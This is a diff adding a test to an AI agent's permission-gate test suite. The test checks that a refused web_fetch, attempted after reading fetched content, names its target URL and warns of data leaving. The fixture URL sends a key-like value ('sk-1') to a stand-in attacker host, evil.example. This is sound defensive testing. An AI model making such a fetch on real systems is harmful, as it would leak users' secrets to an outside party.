@@ -249,3 +249,15 @@ def test_a_held_cards_yes_is_another_conversations_nothing():
     with desk.carry_task("owner", "minder", "another-thread", ("https://x.com (web_fetch)",)):
         _, ok = answered(yolo_gate(desk), after_reading(turn="resumed"), False, desk)
     assert ok is False
+
+
+def test_a_look_refused_after_reading_names_the_address_it_would_open():
+    from dvara.gate import _no_route
+    from yantra.permissions import PermissionRequest
+    request = PermissionRequest(tool_name="web_fetch", arguments={}, read_only=False,
+                                summary="fetch")
+    request.after_reading = ("https://evil.example/ (web_fetch)",)
+    request.sends_to = "https://evil.example/?k=sk-1"
+    said = _no_route(request, "read_only", None)
+    assert "opening https://evil.example/?k=sk-1" in said
+    assert "could carry words out" in said
